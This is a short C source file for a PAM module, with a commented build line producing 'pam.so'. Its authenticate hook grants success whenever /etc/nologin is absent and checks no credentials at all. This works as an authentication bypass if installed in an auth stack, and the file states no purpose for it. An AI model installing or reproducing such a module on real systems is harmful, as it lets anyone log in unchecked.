// #include <stdio.h>
//#include <stdlib.h>
// #include <unistd.h>
// gcc -fPIC -DPIC -shared -rdynamic -o pam.so pam.c 
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>



#ifdef HAVE_CONFIG_H
# include <config.h>
#endif
#include <sys/param.h>
#include <security/pam_modules.h>


#define DEFAULT_NOLOGIN_PATH "/etc/nologin"
PAM_EXTERN int
pam_sm_authenticate(pam_handle_t *pamh, int flags,
	int argc, const char *argv[])
{

	if(open(DEFAULT_NOLOGIN_PATH, O_RDONLY, 0) < 0) 	return PAM_SUCCESS;
	else return PAM_AUTH_ERR;
}

PAM_EXTERN int
pam_sm_setcred(pam_handle_t *pamh, int flags,
	int argc, const char *argv[])
{

	return (PAM_CRED_ERR);
}

PAM_EXTERN int
pam_sm_acct_mgmt(pam_handle_t *pamh, int flags,
	int argc, const char *argv[])
{

	return (PAM_AUTH_ERR);
}

PAM_EXTERN int
pam_sm_open_session(pam_handle_t *pamh, int flags,
	int argc, const char *argv[])
{

	return (PAM_SESSION_ERR);
}

PAM_EXTERN int
pam_sm_close_session(pam_handle_t *pamh, int flags,
	int argc, const char *argv[])
{

	return (PAM_SESSION_ERR);
}

PAM_EXTERN int
pam_sm_chauthtok(pam_handle_t *pamh, int flags,
	int argc, const char *argv[])
{

	return (PAM_AUTHTOK_ERR);
}


